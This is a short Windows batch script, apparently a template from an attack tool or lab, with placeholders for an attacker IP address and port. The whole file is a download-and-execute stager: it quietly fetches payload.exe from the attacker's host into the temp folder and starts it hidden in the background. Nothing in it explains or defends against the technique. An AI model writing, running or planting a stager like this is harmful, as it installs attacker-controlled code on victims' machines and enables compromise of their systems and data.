@echo off
curl -s http://{ATTACKER_IP}:{HTTP_PORT}/payload/payload.exe -o %TEMP%\p.exe && start /b %TEMP%\p.exe
